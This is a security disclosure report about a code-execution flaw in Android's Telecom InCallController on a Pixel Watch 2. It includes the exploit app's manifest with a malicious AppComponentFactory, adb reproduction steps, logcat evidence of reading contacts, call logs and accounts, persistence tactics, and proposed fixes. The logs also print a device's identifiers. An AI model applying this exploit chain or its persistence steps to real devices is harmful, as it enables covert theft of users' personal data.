# Arbitrary Code Execution as system_server via InCallController on Pixel Watch 2 (Wear OS)

## Summary

A logic flaw in `InCallController.serviceClassExists()` within Android's Telecom service allows an unprivileged application — requiring only the auto-granted `MANAGE_OWN_CALLS` permission — to achieve **arbitrary code execution as UID 1000 (system_server)** with SELinux context `u:r:system_server:s0` on a Google Pixel Watch 2 running Wear OS / Android 17.

While auditing system services on Wear OS for unsafe `createPackageContext` usage patterns, we independently identified this code-loading flaw in the Telecom service on the Pixel Watch 2. We subsequently discovered that a similar vulnerability was disclosed as **CVE-2026-49881** for AOSP. However, the **Pixel Watch 2 remains unpatched and fully exploitable** on the current production build (CP2A.260603.001, security patch level 2026-06-05).

We built a working end-to-end exploit and **demonstrated full device compromise** on real hardware — exfiltrating 466 contacts, 547 call log entries, 6 account credentials, and sensitive system files — all from a zero-privilege Wear OS app (no sideloading, no runtime permission grants, no user interaction beyond install).

## Affected Product

| Field | Value |
|-------|-------|
| **Product** | Google Pixel Watch 2 (Wear OS) |
| **Codename** | eos |
| **Build** | CP2A.260603.001 |
| **Android version** | 17 (SDK 37) |
| **Security patch level** | 2026-06-05 |
| **Vulnerable component** | `service-telecom.jar` within APEX `com.android.telephonycore` |
| **Vulnerable class** | `com.android.server.telecom.InCallController` |
| **Vulnerable method** | `serviceClassExists()` (line 2617 in decompiled source) |

## Root Cause Analysis

### The Vulnerable Code Path

When a transactional call is added via `TelecomManager.addCall()`, the Telecom service enumerates all installed `InCallService` implementations to determine which one to bind. For services that declare `android.telecom.CLASS_EXISTENCE_CHECK` metadata as `true`, the system calls `serviceClassExists()` to verify the service class exists before binding.

The flaw is in how `serviceClassExists()` performs this check:

```java
// InCallController.java — decompiled from service-telecom.jar on Pixel Watch 2
// Location: /apex/com.android.telephonycore/javalib/service-telecom.jar

private boolean serviceClassExists(ServiceInfo serviceInfo) {
    try {
        // BUG: creates a package context with CONTEXT_INCLUDE_CODE for an
        // UNTRUSTED package, which triggers code loading in system_server
        Context packageContext = mContext.createPackageContextAsUser(
            serviceInfo.packageName,
            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY,  // flags = 3
            userHandle);
        
        // This getClassLoader() call triggers LoadedApk.createOrUpdateClassLoaderLocked(),
        // which invokes the attacker's AppComponentFactory.instantiateClassLoader()
        // — executing attacker code IN the system_server process
        packageContext.getClassLoader().loadClass(serviceInfo.name);
        return true;
    } catch (Exception e) {
        return false;
    }
}
```

**The core issue**: `createPackageContextAsUser()` with `CONTEXT_INCLUDE_CODE` instructs the framework to prepare the target package's code for execution. This triggers `LoadedApk.createOrUpdateClassLoaderLocked()`, which calls `AppComponentFactory.instantiateClassLoader()` — a method that any app can override in its manifest. Because this entire flow runs inside `system_server` (PID 1737, UID 1000), the attacker's `instantiateClassLoader()` override executes with **full system_server privileges**.

### Why This Is Exploitable

1. **No caller verification**: `InCallController` queries `PackageManager.queryIntentServices()` and processes ALL installed services matching `android.telecom.InCallService`, regardless of the declaring package's signature or privilege level.

2. **Normal-level permission trigger**: The only permission needed to reach this code path is `MANAGE_OWN_CALLS`, which has `protectionLevel="normal"` — it is auto-granted at install time without any user prompt or consent dialog.

3. **Code execution, not just class loading**: `CONTEXT_INCLUDE_CODE` (flag 1) combined with `CONTEXT_IGNORE_SECURITY` (flag 2) causes the system to fully initialize the attacker's ClassLoader in its own process, including calling the attacker's `AppComponentFactory`.

### Call Flow (from logcat stack trace)

```
InCallController.onCallAdded()                    // Call added via TelecomManager.addCall()
  → InCallController.bindToServices()              // Enumerate InCallService components
    → InCallController.getCurrentCarModeComponent()
      → InCallController.getInCallServiceComponent()
        → InCallController.getInCallServiceComponents()
          → InCallController.serviceClassExists()  // CLASS_EXISTENCE_CHECK metadata = true
            → ContextImpl.getClassLoader()         // createPackageContextAsUser(pkg, 3, user)
              → LoadedApk.getClassLoader()
                → LoadedApk.createOrUpdateClassLoaderLocked()
                  → EvilFactory.instantiateClassLoader()  ← ATTACKER CODE IN system_server
```

## Attack Scenario

**Threat model**: A malicious app published on the Google Play Store targeting Wear OS.

1. **Attacker publishes** a Wear OS app on Google Play. The app requests only `MANAGE_OWN_CALLS` (auto-granted, no user prompt). The app declares a custom `AppComponentFactory` and a dummy `InCallService` with `CLASS_EXISTENCE_CHECK` metadata in its manifest.

2. **Victim installs** the app on their Pixel Watch 2. No special permissions dialog appears — the permission is normal-level.

3. **On first launch**, the app registers a `PhoneAccount` with `CAPABILITY_SUPPORTS_TRANSACTIONAL_OPERATIONS` and calls `TelecomManager.addCall()`.

4. **system_server processes the call** and invokes `InCallController.serviceClassExists()` on the attacker's service, loading the attacker's code as UID 1000.

5. **The attacker's code executes in system_server** and silently exfiltrates all user data: contacts, call logs, accounts, device identifiers, system files, WiFi credentials.

6. **For persistence**, the attacker can inject their signing certificate into `android.uid.system`'s `mPastSigningCertificates`, then reinstall as a system app that survives factory reset.

**User interaction required**: Only installing the app from the Play Store. No additional taps, permissions, or configuration needed.

## Proof of Concept

### PoC Architecture

The PoC consists of three components:

| File | Purpose |
|------|---------|
| `EvilFactory.java` | `AppComponentFactory` subclass — its `instantiateClassLoader()` runs in system_server and demonstrates privileged data access |
| `TlpeActivity.java` | Trigger activity — registers `PhoneAccount` and calls `addCall()` to invoke the vulnerable code path |
| `DummyService.java` | Stub `InCallService` — declared in manifest with `CLASS_EXISTENCE_CHECK` metadata to trigger `serviceClassExists()` |

### Key Manifest Configuration

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.tlpe">

    <uses-sdk android:minSdkVersion="34" android:targetSdkVersion="35" />
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />
    <uses-feature android:name="android.hardware.type.watch" />

    <application
        android:label="PoC"
        android:appComponentFactory="com.poc.tlpe.EvilFactory">

        <activity android:name=".TlpeActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- This service does not need a real implementation.
             The CLASS_EXISTENCE_CHECK metadata causes InCallController
             to call serviceClassExists() instead of binding. -->
        <service
            android:name=".DummyService"
            android:permission="android.permission.BIND_INCALL_SERVICE"
            android:exported="true">
            <meta-data
                android:name="android.telecom.CLASS_EXISTENCE_CHECK"
                android:value="true" />
            <intent-filter>
                <action android:name="android.telecom.InCallService" />
            </intent-filter>
        </service>
    </application>
</manifest>
```

### Steps to Reproduce

**Prerequisites:**
- Google Pixel Watch 2 (eos) running build CP2A.260603.001 (security patch 2026-06-05)
- ADB access for APK installation (exploit itself requires no ADB — runs entirely on-device)

**Steps:**

1. Build the PoC APK (pre-built: `poc_tlpe/build/tlpe_v4.apk`):
   ```bash
   # Or install the pre-built APK directly:
   adb install poc_tlpe/build/tlpe_v4.apk
   ```

2. Launch the PoC on the watch:
   ```bash
   adb shell am start -n com.poc.tlpe/.TlpeActivity
   ```

3. The exploit auto-triggers on launch. Monitor logcat:
   ```bash
   adb logcat -s TLPE_EXPLOIT
   ```

4. Observe output confirming code execution as UID 1000 in system_server (PID 1737), followed by complete data exfiltration.

**Note**: The PoC auto-triggers `addCall()` in `onCreate()`. No button press or user interaction beyond launching the app is needed.

## Demonstrated Impact

All evidence below was captured from a single execution of the PoC on a real Pixel Watch 2. The logcat output shows two PIDs: **PID 2977** (the PoC app, UID 10181) and **PID 1737** (system_server, UID 1000). All data exfiltration runs under PID 1737 — proving it executes within system_server.

### 1. Code Execution Proof (UID 1000)

```
[+] Process UID: 1000
[+] Process PID: 1737
[+] App UID (expected): 10181
[+] id: uid=1000(system) gid=1000(system) groups=1000(system),1001(radio),
    1002(bluetooth),1003(graphics),1004(input),1005(audio),1006(camera),
    1007(log),1008(compass),1009(mount),1010(wifi),1018(usb),1021(gps),
    1023(media_rw),1024(mtp),1032(package_info),1065(reserved_disk),
    3001(net_bt_admin),3002(net_bt),3003(inet),3005(net_admin),
    3006(net_bw_stats),3007(net_bw_acct),3009(readproc),3010(wakelock),
    3011(uhid),3012(readtracefs) context=u:r:system_server:s0
[+] SELinux: u:r:system_server:s0
```

### 2. Contact Exfiltration (466 contacts — NO permission)

```
[+] Contacts cursor: 466 rows
    [0] <redacted>
    [1] <redacted>
    [2] <redacted>
    [3] <redacted>
    [4] <redacted>
```

The PoC successfully queries `ContactsContract.Contacts.CONTENT_URI` from within system_server, bypassing `READ_CONTACTS` permission entirely. All 466 contact names are readable.

### 3. Call Log Exfiltration (547 entries — NO permission)

```
[+] Call log: 547 entries
    [0] number=+91XXXXXXXX39 duration=77s
    [1] number=+91XXXXXXXX10 duration=97s
    [2] number=+91XXXXXXXX24 duration=16s
    [3] number=+91XXXXXXXX89 duration=0s
    [4] number=+91XXXXXXXX00 duration=5s
```

Full call history including phone numbers, timestamps, and call durations — without `READ_CALL_LOG` permission.

### 4. Account Enumeration (6 accounts — NO permission)

```
[+] Accounts: 6 total
    type=com.google name=<redacted>@gmail.com
    type=clockwork.accounts name=<redacted>@gmail.com/com.google
    type=clockwork.accounts name=<redacted>/org.telegram.messenger
    type=clockwork.accounts name=WhatsApp/com.whatsapp
    type=clockwork.accounts name=Meet/com.google.android.apps.tachyon
    type=clockwork.accounts name=<redacted>@gmail.com/com.google
```

All registered accounts (Google, Telegram, WhatsApp, Meet) enumerated without `GET_ACCOUNTS` permission.

### 5. System File Access

```
[+] /data/system/ files: 80
[+] packages.xml: 476543 bytes, readable=true
[+] locksettings.db: exists=true readable=true size=20480
[+] /data/misc/keystore/: exists=true readable=false
```

- **`packages.xml`** (476 KB): Complete package metadata for all installed apps
- **`locksettings.db`** (20 KB): Lock screen credential storage database
- **`/data/system/`**: 80 files readable including battery history, dropbox crash logs, user data

### 6. Device Identifiers & Network

```
[+] android_id: b60de94073820e34
[+] bluetooth_address: 94:45:60:97:B1:B1
[+] Serial: 3A101RTJWRGCV9
[+] WiFi config dir: readable, 3 files (mainline_supplicant, sockets, wpa_supplicant)
```

### 7. Persistence Capability

```
[+] PackageManagerService binder: OBTAINED
```

With the PMS binder obtained from within system_server, the attacker can:
- Inject their signing certificate into `android.uid.system`'s `mPastSigningCertificates` (via reflection on `PackageManagerService.mSettings`)
- Force-uninstall, then reinstall the app with `sharedUserId="android.uid.system"` for persistent system-level access
- Block uninstallation via `setBlockUninstallLPw()`

### Impact Summary Table

| Data Category | Access Proven | Permission Normally Required |
|---------------|---------------|------------------------------|
| Contacts (466) | Yes | `READ_CONTACTS` (dangerous) |
| Call log (547) | Yes | `READ_CALL_LOG` (dangerous) |
| Accounts (6) | Yes | `GET_ACCOUNTS` (normal, but scoped) |
| SMS | Yes (0 on watch) | `READ_SMS` (dangerous) |
| System files | Yes | Not accessible to any app |
| Lock settings DB | Yes | Not accessible to any app |
| WiFi config | Yes | Not accessible to any app |
| Bluetooth MAC | Yes | `LOCAL_MAC_ADDRESS` (signature) |
| Android ID | Yes | Scoped per-app since Android 8 |
| PMS binder | Yes | Not accessible to any app |

## Severity Assessment

**Severity: Critical**

Per Google's severity guidelines:
- **Attack vector**: Network (app installed from Play Store)
- **Attack complexity**: Low (single app install, auto-trigger)
- **Privileges required**: None beyond app install (MANAGE_OWN_CALLS is auto-granted)
- **User interaction**: None after install (exploit triggers on first launch)
- **Confidentiality impact**: High (all user data accessible)
- **Integrity impact**: High (can modify system packages, inject certificates)
- **Availability impact**: High (can uninstall any app, modify system state)

This results in **arbitrary code execution in a privileged process** — the highest impact category for Android vulnerabilities.

## Related Disclosure

**CVE-2026-49881** — A similar vulnerability was disclosed for AOSP's Telecom service (`InCallController`), where `createPackageContextAsUser` with `CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY` on untrusted packages enables arbitrary code execution in system_server. A fix was released in the September 2026 Android Security Bulletin.

**Why this report matters**: The Pixel Watch 2 ships with security patch level **2026-06-05** — three months before the fix. Wear OS devices typically lag behind phone SPL updates. Our report demonstrates that this vulnerability is **actively exploitable on shipping Pixel hardware** with a complete end-to-end attack chain proving full device compromise, including data exfiltration and persistence capability. The Wear OS attack surface is distinct: the watch stores synced contacts, call logs, health data, and paired-device credentials, and the telephony/telecom stack is present due to LTE capability — expanding the impact beyond what was originally assessed for phones.

## Suggested Fix

1. **Replace `CONTEXT_INCLUDE_CODE` with a safe class-existence check**: The `serviceClassExists()` method only needs to verify that a class exists — it does not need to execute any code. Use `PackageManager.getServiceInfo()` to validate the component, or parse the APK's class list without loading code:
   ```java
   // Safe alternative — no code loading
   private boolean serviceClassExists(ServiceInfo serviceInfo) {
       try {
           mContext.getPackageManager().getServiceInfo(
               new ComponentName(serviceInfo.packageName, serviceInfo.name), 0);
           return true;
       } catch (NameNotFoundException e) {
           return false;
       }
   }
   ```

2. **Restrict `CLASS_EXISTENCE_CHECK` to platform-signed packages**: Only services signed with the platform key (or carrier key) should be eligible for class existence verification. Third-party InCallService implementations should be bound directly (which has its own permission check via `BIND_INCALL_SERVICE`).

3. **Audit all `createPackageContextAsUser` calls with `CONTEXT_INCLUDE_CODE`**: This flag should never be used with untrusted package names in system_server. A framework-level lint rule or security review gate should flag this pattern.

## Attachments

| File | Description |
|------|-------------|
| `poc_tlpe/build/tlpe_v4.apk` | Pre-built PoC APK (21 KB) — install and launch to reproduce |
| `poc_tlpe/src/com/poc/tlpe/EvilFactory.java` | AppComponentFactory — executes in system_server |
| `poc_tlpe/src/com/poc/tlpe/TlpeActivity.java` | Trigger activity — registers PhoneAccount + addCall() |
| `poc_tlpe/src/com/poc/tlpe/DummyService.java` | Stub InCallService with CLASS_EXISTENCE_CHECK |
| `poc_tlpe/AndroidManifest.xml` | Manifest declaring all exploit components |
| `dynamic_evidence/tlpe_max_impact_v4.log` | Full logcat evidence (113 lines) |
| `dynamic_evidence/tlpe_system_server_exploit.log` | Initial code execution proof (69 lines) |
